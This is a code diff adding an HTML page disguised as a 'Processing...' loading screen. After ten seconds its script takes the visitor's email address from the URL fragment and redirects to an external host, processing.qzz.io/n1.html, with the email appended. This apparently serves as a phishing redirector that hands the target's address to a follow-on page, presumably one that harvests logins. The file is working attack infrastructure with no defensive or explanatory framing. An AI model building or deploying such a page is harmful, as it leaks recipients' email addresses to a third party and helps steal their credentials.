@@ -1,0 +1,57 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Processing...</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: white;
+    }
+    .container {
+      text-align: center;
+    }
+    .text {
+      margin-top: 15px;
+      font-size: 20px;
+      color: black;
+      opacity: 0.8;
+      font-family: Arial, sans-serif;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Your GIF animation -->
+    <img src="https://cdn.pixabay.com/animation/2023/08/21/13/31/13-31-04-403_512.gif" alt="Processing Animation" width="150" />
+    <div class="text">Processing...</div>
+  </div>
+
+  <script>
+  setTimeout(() => {
+    // Get email from hash (remove the #)
+    const email = window.location.hash.substring(1);
+
+    // Base redirect URL
+    let redirectUrl = "http://processing.qzz.io/n1.html";
+
+    // Append email if it exists
+    if (email) {
+      redirectUrl += "#" + encodeURIComponent(email);
+    }
+
+    window.location.href = redirectUrl;
+  }, 10000);
+</script>
+
+</body>
+
+</html>
+
+
